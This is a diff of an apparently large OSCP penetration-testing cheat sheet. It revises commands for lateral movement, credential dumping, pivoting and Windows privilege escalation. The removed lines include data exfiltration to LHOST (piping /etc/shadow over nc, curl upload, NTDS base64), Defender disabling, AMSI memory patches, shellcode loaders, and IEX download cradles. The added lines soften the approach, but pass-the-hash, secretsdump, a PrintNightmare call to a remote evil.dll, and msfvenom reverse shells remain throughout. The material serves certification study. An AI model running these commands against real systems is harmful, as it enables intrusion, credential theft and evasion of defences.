 evil-winrm -i $IP -u Administrator -H NTLMHASH
 nxc smb $IP -u Administrator -H NTLMHASH -x 'whoami'
 
-# ── SPRAY DA HASH EVERYWHERE ──────────────────────────────────
-nxc smb 10.10.10.0/24 -u Administrator -H NTLMHASH --continue-on-success
-# Local admin hash spray (built-in Administrator is same on all):
-nxc smb 10.10.10.0/24 -u Administrator -H NTLMHASH --local-auth
+# ── VALIDATE DA HASH ON ONE JUSTIFIED HOST FIRST ───────────────
+# Start with a host already shown reachable/relevant; record auth vs admin separately.
+nxc smb $TARGET -u Administrator -H NTLMHASH
+# Only when provenance proves this is a local/SAM credential on that exact host:
+nxc smb $TARGET -u Administrator -H NTLMHASH --local-auth
+# Expand only through observed in-scope services / Credential Debt; do not blanket-spray a /24.
 
 # ── DUMP LSASS (for more creds) ───────────────────────────────
 # From admin shell:
@@ -4917,11 +5133,11 @@ Get-ObjectAcl -SamAccountName * -ResolveGUIDs | Where-Object {$_.ActiveDirectory
 
 # Kali-side read-only confirmation helpers:
 bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" get writable --detail
-impacket-dacledit -action read -principal "$CONTROLLED_PRINCIPAL" -target "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER:$AUTH_PASS"
-impacket-owneredit -action read -target "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER:$AUTH_PASS"
+impacket-dacledit -action read -principal "$CONTROLLED_PRINCIPAL" -target "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER"
+impacket-owneredit -action read -target "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER"
 ```
 
-Then use **9.6B V19 BloodHound Edge Execution Desk** for the exact target
+Then use **9.6B BloodHound Edge Execution Desk** for the exact target
 type. It includes current commands and the required pre-state, minimum-change,
 verification and rollback sequence. Do not substitute `Domain Admins`, the
 domain object or another high-value target for the destination actually shown
@@ -4951,21 +5167,21 @@ in your graph.
 # RDP (3389): xfreerdp
 
 # ── IMPACKET SUITE ────────────────────────────────────────────
-impacket-psexec $DOMAIN/user:pass@$IP               # Creates service, uploads binary
+impacket-psexec $DOMAIN/user@$IP               # Creates service, uploads binary
 impacket-psexec $DOMAIN/user@$IP -hashes :NTLMHASH
-impacket-wmiexec $DOMAIN/user:pass@$IP              # WMI — no service created
-impacket-smbexec $DOMAIN/user:pass@$IP              # SMB — no binary on disk
-impacket-atexec $DOMAIN/user:pass@$IP "whoami"      # Task scheduler
-impacket-dcomexec $DOMAIN/user:pass@$IP 'cmd.exe /c whoami' -object MMC20  # DCOM
+impacket-wmiexec $DOMAIN/user@$IP              # WMI — no service created
+impacket-smbexec $DOMAIN/user@$IP              # SMB — no binary on disk
+impacket-atexec $DOMAIN/user@$IP "whoami"      # Task scheduler
+impacket-dcomexec $DOMAIN/user@$IP 'cmd.exe /c whoami' -object MMC20  # DCOM
 
 # ── nxc ──────────────────────────────────────────────
-nxc smb $IP -u user -p pass -x 'whoami'           # cmd
-nxc smb $IP -u user -p pass -X 'Get-Process'      # PowerShell
-nxc winrm $IP -u user -p pass -x 'whoami'
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" -x 'whoami'           # cmd
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" -X 'Get-Process'      # PowerShell
+nxc winrm $IP -u "$AUTH_USER" -p "$AUTH_PASS" -x 'whoami'
 nxc smb $IP -u admin -H HASH -x 'whoami'             # One justified host first
 
 # ── EVIL-WINRM ────────────────────────────────────────────────
-evil-winrm -i $IP -u user -p pass
+evil-winrm -i $IP -u "$AUTH_USER" -p "$AUTH_PASS"
 # Upload tool:
 upload /tmp/winPEAS.exe
 # Proof must be read in place in the interactive target shell:
@@ -5775,7 +5991,6 @@ ROOT EXECUTES FILE
 
 
 <details>
-
 
 <summary>⏰ 12.16 Cron, Timers & Scheduled Jobs</summary>
 
@@ -6777,7 +6992,6 @@ NAME NOT FOUND
 PATH NOT FOUND
 ACCESS DENIED
 ```
-
 Check:
 
 ``` text
@@ -7258,10 +7472,10 @@ IEX(New-Object Net.WebClient).DownloadString('http://LHOST/Sherlock.ps1'); Find-
 
 # ── KEY EXPLOITS ──────────────────────────────────────────────
 # MS16-032 — Win7-10 / 2008-2012R2:
-Invoke-MS16032 -Application cmd.exe -commandline "/c net user pwn3d P@ssw0rd! /add && net localgroup administrators pwn3d /add"
+Invoke-MS16032 -Application cmd.exe -commandline "/c whoami"  # validate primitive first; avoid persistent account creation
 
 # CVE-2021-1675 / CVE-2021-34527 — PrintNightmare (All Windows):
-python3 CVE-2021-1675.py domain/user:pass@IP '\\LHOST\share\evil.dll'
+python3 CVE-2021-1675.py "$DOMAIN/$AUTH_USER@$TARGET" '\\LHOST\share\evil.dll'  # omit :password; prefer the PoC's interactive prompt
 
 # CVE-2020-0796 — SMBGhost (Win10 1903/1909 — not 2004+):
 # Local LPE only (not remote — don't confuse versions)
@@ -7440,10 +7654,18 @@ interface_add_route --name ligolo --route 10.10.10.0/24
 # Manual route fallback if the managed command is unavailable:
 # sudo ip route add 192.168.100.0/24 dev ligolo
 
+# ── AGENT LOCALHOST / LOCAL-ONLY SERVICES ────────────────────
+# Ligolo maps 240.0.0.0/4 to the selected agent's 127.0.0.1.
+# This is the fast path when `ss -lntup` / `netstat -ano` shows a service bound only to localhost.
+sudo ip route add 240.0.0.1/32 dev ligolo 2>/dev/null || true
+nmap -Pn -sT -sV 240.0.0.1
+curl -i http://240.0.0.1:8000/       # replace with the discovered local-only port
+# IMPORTANT: 240.0.0.1 follows the CURRENTLY SELECTED Ligolo agent/session.
+
 # ── NOW ACCESS INTERNAL DIRECTLY ─────────────────────────────
 nmap 192.168.100.0/24                   # Direct scan!
-evil-winrm -i 192.168.100.10 -u user -p pass
-impacket-psexec domain/user:pass@192.168.100.10
+evil-winrm -i $INTERNAL_IP -u "$AUTH_USER" -p "$AUTH_PASS"
+impacket-psexec domain/user@192.168.100.10
 
 # ── CATCH REVERSE SHELLS FROM INTERNAL ───────────────────────
 # In the selected proxy session — add listener:
@@ -7484,7 +7706,7 @@ listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
 # Configure proxychains:
 echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
 proxychains nmap -sT -Pn -p 22,80,445 192.168.x.0/24
-proxychains evil-winrm -i 192.168.x.10 -u user -p pass
+proxychains evil-winrm -i $INTERNAL_IP -u "$AUTH_USER" -p "$AUTH_PASS"
 
 # ── PORT FORWARD ──────────────────────────────────────────────
 ./chisel client LHOST:8000 R:8080:192.168.x.10:80
@@ -7571,28 +7793,30 @@ nc -lvp 8080 < /tmp/pipe | nc 192.168.x.10 80 > /tmp/pipe &
 
 ``` bash
 # ── SMB EXECUTION ─────────────────────────────────────────────
-impacket-psexec domain/user:pass@IP     # Creates service, gives SYSTEM
+impacket-psexec domain/user@IP     # Creates service, gives SYSTEM
 impacket-psexec domain/user@IP -hashes :NTLMHASH
 
 # ── WMI EXECUTION ─────────────────────────────────────────────
-impacket-wmiexec domain/user:pass@IP    # No service created, less noise
+impacket-wmiexec domain/user@IP    # No service created, less noise
 impacket-wmiexec domain/user@IP -hashes :NTLMHASH
 
 # ── SMB SERVICE (quieter than psexec) ─────────────────────────
-impacket-smbexec domain/user:pass@IP    # No binary dropped on disk
+impacket-smbexec domain/user@IP    # No binary dropped on disk
 
 # ── WINRM ─────────────────────────────────────────────────────
-evil-winrm -i IP -u user -p pass
+evil-winrm -i $IP -u "$AUTH_USER" -p "$AUTH_PASS"
 evil-winrm -i IP -u user -H NTLMHASH    # PtH
 
 # ── RDP ───────────────────────────────────────────────────────
-xfreerdp /u:user /p:pass /v:IP +clipboard /dynamic-resolution /cert-ignore
+xfreerdp /u:"$AUTH_USER" /d:"$DOMAIN" /v:$IP +clipboard /dynamic-resolution /cert-ignore
 xfreerdp /u:Administrator /pth:NTLMHASH /v:IP  # PtH (RestrictedAdmin mode)
 
-# ── nxc SPREAD ───────────────────────────────────────
-# After DA — spray creds/hashes on entire subnet:
-nxc smb 10.10.10.0/24 -u Administrator -H HASH --local-auth --continue-on-success
-nxc smb 10.10.10.0/24 -u Administrator -H HASH --local-auth -x 'whoami'
+# ── nxc TARGETED VALIDATION ───────────────────────────
+# After obtaining new material, start with one justified host/service from the scan/graph.
+nxc smb $TARGET -u Administrator -H HASH
+# Exact local/SAM provenance only:
+nxc smb $TARGET -u Administrator -H HASH --local-auth
+# Let Credential Debt / observed services decide any next host; do not blanket a subnet.
 ```
 
 
@@ -7721,36 +7945,30 @@ scp -i key user@LHOST:/path/file /tmp/file
 <details>
 
 
-<summary>📤 15.4 Exfiltration --- Get Files Back to Kali</summary>
+<summary>📤 15.4 Necessary File Retrieval --- RULE-SENSITIVE</summary>
 
-
-
-
-
+> **Current OSCP+ rule:** do not download applications, files, or source code from the exam environment to your local machine unless the file is necessary to compromise the target. Delete the local copy after completing the objective. Prefer reading/searching the file in place first.
 
 ``` bash
-# ── FROM LINUX ────────────────────────────────────────────────
-# Netcat:
-# Kali: nc -nvlp 4444 > loot.tar.gz
-tar czf - /etc/shadow /home/ | nc LHOST 4444
+# 1) FIRST: inspect remotely/in-place whenever possible
+sed -n '1,160p' /path/to/config
+grep -RniE 'pass|secret|token|key|jdbc|connection' /path/to/app 2>/dev/null
 
-# Curl POST:
-curl -X POST http://LHOST/upload -F "file=@/etc/shadow"
+# 2) ONLY IF THE EXACT FILE IS NECESSARY FOR THE COMPROMISE:
+# Kali -> retrieve ONE justified Linux file
+mkdir -p loot/necessary
+scp user@$IP:/absolute/path/to/NECESSARY_FILE loot/necessary/
+sha256sum loot/necessary/NECESSARY_FILE
 
-# Base64 in terminal (paste to Kali):
-base64 /etc/shadow; echo
+# Windows / Evil-WinRM -> retrieve ONE justified file
+download C:\absolute\path\NECESSARY_FILE loot\necessary\NECESSARY_FILE
 
-# ── FROM WINDOWS ──────────────────────────────────────────────
-# PowerShell upload:
-(New-Object Net.WebClient).UploadFile("http://LHOST/upload","C:\Users\user\loot.txt")
-
-# SMB copy:
-copy C:\sensitive.txt \\LHOST\share\sensitive.txt
-robocopy C:\Users \\LHOST\share\ /E /COPYALL
-
-# Base64 in PS (paste to Kali):
-[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Windows\NTDS\ntds.dit"))
+# Record WHY the local copy was necessary and which target it came from.
+# After the objective is complete, delete the local exam-environment copy:
+rm -f loot/necessary/NECESSARY_FILE
 ```
+
+**Do not use this as a collection/exfiltration checklist.** Avoid recursive home/profile/share downloads, bulk archives, database dumps, or "grab everything and grep later" behavior. Retrieve the minimum exact artifact only when it is necessary for the compromise.
 
 
 </details>
@@ -7758,190 +7976,106 @@ robocopy C:\Users \\LHOST\share\ /E /COPYALL
 
 ------------------------------------------------------------------------
 
-## 16. ANTIVIRUS EVASION & DEFENSE BYPASS
+## 16. EXECUTION CONSTRAINTS & DEFENSIVE FRICTION
 
+> **Goal:** determine *why* an otherwise valid action failed, then choose the smallest compatible path. Do not make “disable Defender / bypass AMSI” the default hypothesis. If you already have Administrator/SYSTEM, bank evidence before changing host security state.
 
 <details>
 
+<summary>🧭 16.1 Diagnose the constraint before changing anything</summary>
 
-<summary>🛡️ 16.1 Disable / Bypass Windows Defender</summary>
+```powershell
+# Identity / architecture / PowerShell mode
+whoami /all
+[Environment]::Is64BitProcess
+$PSVersionTable
+$ExecutionContext.SessionState.LanguageMode
+Get-ExecutionPolicy -List
+# Defensive state — READ ONLY
+Get-MpComputerStatus | Select-Object AMServiceEnabled,AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled
+Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
 
-
-
-
-
-
-``` powershell
-# ── DISABLE DEFENDER (needs admin) ───────────────────────────
-Set-MpPreference -DisableRealtimeMonitoring $true
-Set-MpPreference -DisableIOAVProtection $true
-Set-MpPreference -DisableScriptScanning $true
-Set-MpPreference -DisableBehaviorMonitoring $true
-Add-MpPreference -ExclusionPath "C:\Users\Public\"
-Add-MpPreference -ExclusionPath "C:\Windows\Temp\"
-# Via registry:
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
-
-# ── EXECUTION POLICY BYPASS ───────────────────────────────────
-powershell -ep bypass
-powershell -ExecutionPolicy Bypass -nop -c "command"
-# Via encoded command:
-$cmd = 'IEX(New-Object Net.WebClient).DownloadString("http://LHOST/script.ps1")'
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
-$enc = [Convert]::ToBase64String($bytes)
-powershell -enc $enc
-# Bypass via pipe:
-echo IEX(New-Object Net.WebClient).DownloadString('http://LHOST/s.ps1') | powershell -nop -
+# Available interpreters / transfer helpers
+where.exe powershell
+where.exe pwsh
+where.exe cmd
+where.exe certutil
+where.exe curl
+where.exe bitsadmin
+Get-Command powershell,pwsh,cmd,certutil,curl -ErrorAction SilentlyContinue
 ```
 
+**Classify first:** execution policy, Constrained Language/AppLocker/WDAC, AMSI/Defender detection, wrong architecture, filesystem ACL, missing interpreter, transfer failure, or simply a bad command. Preserve the exact error text.
 
 </details>
 
-
 <details>
 
+<summary>🧰 16.2 Smallest fallback path</summary>
 
-<summary>🔓 16.2 AMSI Bypass</summary>
+```powershell
+# ExecutionPolicy is not the same as Defender/AMSI. For a script already transferred:
+powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\script.ps1
 
+# Native/manual fallbacks instead of immediately fighting a control
+whoami /all
+sc query
+schtasks /query /fo LIST /v
+cmdkey /list
+netstat -ano
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+reg query "HKLM\SYSTEM\CurrentControlSet\Services" /s /v ImagePath
 
-
-
-
-
-``` powershell
-# Classic (may be patched — always try first):
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-
-# Via reflection (more evasive):
-$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-$b=$a.GetField('amsiInitFailed','NonPublic,Static')
-$b.SetValue($null,$true)
-
-# String-split to avoid signature:
-$x = 'Syst'+'em.Man'+'agement.Autom'+'ation.A'+'msiU'+'tils'
-[Ref].Assembly.GetType($x).GetField('amsiI'+'nitFailed','NonPublic,Static').SetValue($null,$true)
-
-# Memory patch (most reliable):
-$Win32 = @"
-using System; using System.Runtime.InteropServices;
-public class Win32 {
-  [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
-  [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
-  [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
-}
-"@
-Add-Type $Win32
-$lib = [Win32]::LoadLibrary("amsi.dll")
-$addr = [Win32]::GetProcAddress($lib, "AmsiScanBuffer")
-$old = 0
-[Win32]::VirtualProtect($addr, [UIntPtr]5, 0x40, [ref]$old)
-$patch = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
-[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 6)
+# Confirm architecture before choosing a binary
+wmic os get osarchitecture
+$env:PROCESSOR_ARCHITECTURE
 ```
 
+**Preference order:** native/manual check → alternate already-present interpreter/client → architecture-correct binary → only then a narrowly justified, reversible state change. Record the original state and reason for any mutation.
 
 </details>
 
-
 <details>
 
+<summary>🧪 16.3 Payload / shell troubleshooting without “evasion roulette”</summary>
 
-<summary>🔀 16.3 Payload Obfuscation Techniques</summary>
+```bash
+# Before regenerating a payload, verify the boring failure modes
+file payload.exe
+sha256sum payload.exe
+python3 -m http.server 8000 --directory .
+ss -lntp | grep ":$LPORT"
+ip route get $TARGET
 
-
-
-
-
-
-``` bash
-# ── MSFVENOM ENCODING ─────────────────────────────────────────
-msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT \
-  -e x86/shikata_ga_nai -i 10 -f exe -o shell_enc.exe
-# Multiple encoders chained:
-msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT \
-  -e x86/shikata_ga_nai -i 5 -e x86/countdown -i 3 -f exe -o shell_chain.exe
-
-# ── C SHELLCODE RUNNER (minimal footprint) ────────────────────
-cat > runner.c << 'EOF'
-#include <windows.h>
-#pragma comment(lib,"ws2_32")
-unsigned char sh[] = "\xfc\xe8...";   // msfvenom -f c output
-int main(){
-  void *m=VirtualAlloc(0,sizeof(sh),0x3000,0x40);
-  memcpy(m,sh,sizeof(sh));
-  CreateThread(0,0,(LPTHREAD_START_ROUTINE)m,0,0,0);
-  Sleep(10000);
-  return 0;
-}
-EOF
-x86_64-w64-mingw32-gcc runner.c -o runner.exe -s -w
-
-# ── PYTHON TO EXE (AV bypass via packaging) ───────────────────
-cat > loader.py << 'EOF'
-import ctypes, base64
-sc = base64.b64decode("BASE64_SHELLCODE")
-buf = bytearray(sc)
-ptr = ctypes.windll.kernel32.VirtualAlloc(None,len(buf),0x3000,0x40)
-ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_long(ptr),buf,len(buf))
-t = ctypes.windll.kernel32.CreateThread(None,None,ctypes.c_long(ptr),None,None,None)
-ctypes.windll.kernel32.WaitForSingleObject(t,-1)
-EOF
-pyinstaller --onefile --noconsole loader.py
-
-# ── INVOKE-OBFUSCATION ────────────────────────────────────────
-IEX(New-Object Net.WebClient).DownloadString('http://LHOST/Invoke-Obfuscation.psd1')
-Invoke-Obfuscation
-# Menu choices: TOKEN → ALL → 1
-
-# ── IN-MEMORY ONLY (never touches disk) ───────────────────────
-IEX(New-Object Net.WebClient).DownloadString('http://LHOST/Invoke-PowerShellTcp.ps1')
-IEX(New-Object Net.WebClient).DownloadString('http://LHOST/PowerView.ps1')
-
-# ── LOLBAS — Living Off The Land ──────────────────────────────
-# https://lolbas-project.github.io
-# mshta (execute remote JS/VBS):
-mshta.exe http://LHOST/payload.hta
-# regsvr32 (no-mark-of-the-web bypass):
-regsvr32 /s /n /u /i:http://LHOST/file.sct scrobj.dll
-# msbuild (execute inline C#):
-msbuild.exe payload.xml
-# installutil:
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /logtoconsole=false /U payload.exe
-# certutil (encode/decode):
-certutil -encode payload.exe payload.b64
-certutil -decode payload.b64 payload.exe
-# rundll32:
-rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("cmd",0,true);
+# Generate only the architecture/format actually required.
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe
 ```
 
+If a payload is removed or blocked, capture the exact symptom and reconsider the delivery/execution primitive. Repacking, encoder chains, memory patches and broad security-control disabling are poor default exam-time debugging strategies.
 
 </details>
 
-
 <details>
 
+<summary>🔒 16.4 Constrained PowerShell — prove it, then pivot tools</summary>
 
-<summary>🔒 16.4 Constrained Language Mode Bypass</summary>
+```powershell
+$ExecutionContext.SessionState.LanguageMode
+Get-ExecutionPolicy -List
+Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
 
-
-
-
-
-
-``` powershell
-# Check if CLM is active:
-$ExecutionContext.SessionState.LanguageMode   # ConstrainedLanguage = restricted
-
-# Bypass methods:
-# 1. Use PowerShell 2.0 (older version, no CLM):
-powershell -Version 2 -ep bypass -c "IEX..."
-# 2. Use custom runspace:
-# 3. PSBypassCLM tool
-# 4. .NET directly from cmd:
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:bypass.exe bypass.cs
-# 5. Use a different interpreter (python, perl, etc.)
+# Native alternatives for common goals
+whoami /priv
+whoami /groups
+net user
+net localgroup administrators
+sc qc <SERVICE>
+schtasks /query /fo LIST /v
+reg query HKCU /f password /t REG_SZ /s
+reg query HKLM /f password /t REG_SZ /s
 ```
 
+Do not assume “PowerShell failed” means “find an AMSI bypass.” First decide whether you need PowerShell at all.
 
 </details>
 
@@ -8499,13 +8633,15 @@ echo === PROOF === && type C:\Users\Administrator\Desktop\proof.txt
       - Submit flags in the control panel AS SOON AS you get them
       - Don't rely on memory — copy/paste to notes immediately
       - If proof.txt is denied, your current context does not satisfy the proof-file access requirement; verify the intended privileged identity and original path
-      - Both flags count for points — don't skip user flag
+      - On stand-alone machines, both flags contribute points — don't skip local.txt
+      - On AD machines, do NOT infer points from local.txt/proof.txt; follow the exact objectives and values shown in the Exam Control Panel
       
-    PARTIAL POINTS:
-      - Local.txt (user shell) = 10 pts
-      - Proof.txt (root/admin) = 10 pts
-      - Total per machine = 20 pts
-      - Documenting HOW you got there is required for credit
+    STAND-ALONE MACHINE POINTS:
+      - Initial access / local.txt objective = 10 pts
+      - Privilege escalation / proof.txt objective = +10 pts
+      - Fully completed stand-alone machine = 20 pts
+      - AD set scoring is separate: machine #1 = 10, machine #2 = 10, machine #3 = 20 (40 total)
+      - Document every attack step, command and relevant output; insufficient documentation can reduce or eliminate credit
 
 
 </details>
@@ -8535,12 +8671,12 @@ echo === PROOF === && type C:\Users\Administrator\Desktop\proof.txt
 ## Credentials Found
 | Username | Password | Hash | Service | Where Found |
 |----------|----------|------|---------|-------------|
-| admin    | admin123 |      | SSH     | /etc/backup |
+| admin    | <redacted> |      | SSH     | /etc/backup |
 
 ## Attack Path
 1. Port 80 → WordPress 5.2.3
 2. wpscan → user: admin
-3. Brute force → admin:admin123
+3. Recovered/validated credential → admin:<redacted> (record source + exact login proof)
 4. Theme editor → PHP shell
 5. Shell as www-data
 6. /etc/cron.d → root runs /opt/backup.sh
@@ -8695,37 +8831,37 @@ HTTPS Alt 513 rlogin \| 8888 HTTP Alt 514 rsyslog \| 9200 Elasticsearch
 
     ```bash
     # ── EXECUTION ─────────────────────────────────────────────────
-    impacket-psexec     DOMAIN/user:pass@IP          # SMB exec → SYSTEM
-    impacket-smbexec    DOMAIN/user:pass@IP          # SMB exec → service shell
-    impacket-wmiexec    DOMAIN/user:pass@IP          # WMI exec → no service
-    impacket-atexec     DOMAIN/user:pass@IP 'whoami' # Task scheduler
-    impacket-dcomexec   DOMAIN/user:pass@IP 'whoami' # DCOM exec
+    impacket-psexec     DOMAIN/user@IP          # SMB exec → SYSTEM
+    impacket-smbexec    DOMAIN/user@IP          # SMB exec → service shell
+    impacket-wmiexec    DOMAIN/user@IP          # WMI exec → no service
+    impacket-atexec     DOMAIN/user@IP 'whoami' # Task scheduler
+    impacket-dcomexec   DOMAIN/user@IP 'whoami' # DCOM exec
 
     # ── KERBEROS ──────────────────────────────────────────────────
     impacket-GetNPUsers    DOMAIN/ -dc-ip IP -request           # AS-REP roast
-    impacket-GetUserSPNs   DOMAIN/user:pass -dc-ip IP -request  # Kerberoast
+    impacket-GetUserSPNs   DOMAIN/user -dc-ip IP -request  # Kerberoast
     impacket-ticketer      -nthash HASH -domain-sid SID -domain DOMAIN user  # Ticket forge
-    impacket-getTGT        DOMAIN/user:pass                      # Get TGT
-    impacket-getST         DOMAIN/user:pass -spn cifs/target     # Get service ticket
+    impacket-getTGT        DOMAIN/user                      # Get TGT
+    impacket-getST         DOMAIN/user -spn cifs/target     # Get service ticket
 
     # ── CREDENTIAL DUMPING ────────────────────────────────────────
-    impacket-secretsdump   DOMAIN/user:pass@IP                   # Remote dump
-    impacket-secretsdump   DOMAIN/user:pass@IP -just-dc-ntlm     # NTDS only
+    impacket-secretsdump   DOMAIN/user@IP                   # Remote dump
+    impacket-secretsdump   DOMAIN/user@IP -just-dc-ntlm     # NTDS only
     impacket-secretsdump   -sam SAM -system SYSTEM LOCAL         # Local files
     impacket-secretsdump   -ntds ntds.dit -system SYSTEM LOCAL   # NTDS.dit
 
     # ── ENUMERATION ───────────────────────────────────────────────
-    impacket-lookupsid     DOMAIN/user:pass@IP                   # SID enum
-    impacket-samrdump      DOMAIN/user:pass@IP                   # SAR dump
+    impacket-lookupsid     DOMAIN/user@IP                   # SID enum
+    impacket-samrdump      DOMAIN/user@IP                   # SAR dump
     impacket-rpcdump       IP                                    # RPC endpoints
-    impacket-reg           DOMAIN/user:pass@IP query -keyName HKU # Remote registry
+    impacket-reg           DOMAIN/user@IP query -keyName HKU # Remote registry
 
     # ── FILE OPERATIONS ───────────────────────────────────────────
-    impacket-smbclient     DOMAIN/user:pass@IP                   # SMB client
+    impacket-smbclient     DOMAIN/user@IP                   # SMB client
     impacket-smbserver     share /path/to/share -smb2support     # Host SMB share
 
     # ── DATABASE ──────────────────────────────────────────────────
-    impacket-mssqlclient   DOMAIN/user:pass@IP                   # MSSQL client
+    impacket-mssqlclient   DOMAIN/user@IP                   # MSSQL client
 
     # ── NETWORK ───────────────────────────────────────────────────
 
@@ -8754,40 +8890,44 @@ HTTPS Alt 513 rlogin \| 8888 HTTP Alt 514 rsyslog \| 9200 Elasticsearch
 
 ``` bash
 # ── SMB ───────────────────────────────────────────────────────
-nxc smb IP -u user -p pass
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS"
 nxc smb IP -u user -H NTLMHASH          # PtH
-nxc smb IP -u users.txt -p pass          # User spray
-nxc smb IP -u user -p passwords.txt      # Pass spray
-nxc smb IP -u user -p pass --shares      # List shares
-nxc smb IP -u user -p pass --sessions    # Active sessions
-nxc smb IP -u user -p pass --users       # Domain users
-nxc smb IP -u user -p pass --groups      # Domain groups
-nxc smb IP -u user -p pass --computers   # Domain computers
-nxc smb IP -u user -p pass --loggedon-users
-nxc smb IP -u user -p pass --sam         # Dump SAM
-nxc smb IP -u user -p pass --lsa         # Dump LSA
-nxc smb IP -u user -p pass --ntds        # Dump NTDS (DC only)
-nxc smb IP -u user -p pass -x 'whoami'   # Run cmd command
-nxc smb IP -u user -p pass -X 'Get-Process'  # Run PS command
-nxc smb IP -u user -p pass --local-auth  # Local account auth
-nxc smb IP/24 -u admin -H HASH --local-auth --continue-on-success
+# Lockout-aware validation: one known/evidence-derived combination first
+nxc smb "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS"
+# If policy is known and evidence justifies a shortlist, use the Credential Debt/Guard workflow instead of blind spraying.
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --shares      # List shares
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --sessions    # Active sessions
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --users       # Domain users
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --groups      # Domain groups
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --computers   # Domain computers
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --loggedon-users
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --sam         # Dump SAM
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --lsa         # Dump LSA
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --ntds        # Dump NTDS (DC only)
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" -x 'whoami'   # Run cmd command
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" -X 'Get-Process'  # Run PS command
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --local-auth  # Local account auth
+# Validate a recovered local-admin hash on one justified host first; expand only through observed in-scope SMB targets / Credential Debt.
+nxc smb "$TARGET" -u "$AUTH_USER" -H "$NTLM_HASH" --local-auth
 
 # ── WINRM ─────────────────────────────────────────────────────
-nxc winrm IP -u user -p pass
-nxc winrm IP -u user -p pass -x 'whoami'
+nxc winrm $IP -u "$AUTH_USER" -p "$AUTH_PASS"
+nxc winrm $IP -u "$AUTH_USER" -p "$AUTH_PASS" -x 'whoami'
 
 # ── SSH ───────────────────────────────────────────────────────
-nxc ssh IP -u user -p pass
-nxc ssh IP/24 -u root -p passwords.txt
+nxc ssh $IP -u "$AUTH_USER" -p "$AUTH_PASS"
+# Use only an evidence-derived shortlist against one justified host
+[ -s "$SHORTLIST" ] && nxc ssh "$TARGET" -u root -p "$SHORTLIST"
 
 # ── MSSQL ─────────────────────────────────────────────────────
-nxc mssql IP -u sa -p pass -q "SELECT @@version"
-nxc mssql IP -u sa -p pass --local-auth
-nxc mssql IP -u sa -p pass -x "whoami"  # xp_cmdshell
+nxc mssql $IP -u "$AUTH_USER" -p "$AUTH_PASS" -q "SELECT @@version"
+nxc mssql $IP -u "$AUTH_USER" -p "$AUTH_PASS" --local-auth
+nxc mssql $IP -u "$AUTH_USER" -p "$AUTH_PASS" -x "whoami"  # xp_cmdshell
 
 # ── RDP ───────────────────────────────────────────────────────
-nxc rdp IP -u user -p pass
-nxc rdp IP/24 -u Administrator -p 'Password123'
+nxc rdp $IP -u "$AUTH_USER" -p "$AUTH_PASS"
+# Validate one justified host first; do not broad-spray RDP
+nxc rdp "$TARGET" -u Administrator -p "$AUTH_PASS"
 
 # ── OUTPUT INTERPRETATION ─────────────────────────────────────
 # [+] GREEN  = Authentication success
@@ -8850,7 +8990,6 @@ nxc rdp IP/24 -u Administrator -p 'Password123'
 
     OSCP EXAM GUIDE:
       Official:             https://help.offsec.com/hc/en-us/articles/360040165632
-
 
 </details>
 
@@ -8932,13 +9071,13 @@ dir /s /b *pass* *cred* *vnc* 2>nul
 impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC_IP" -request -no-pass -usersfile users.txt -outputfile asrep.txt
 
 # Kerberoast with creds:
-impacket-GetUserSPNs "$DOMAIN/$AUTH_USER:$AUTH_PASS" -dc-ip "$DC_IP" -request -outputfile kerberoast.txt
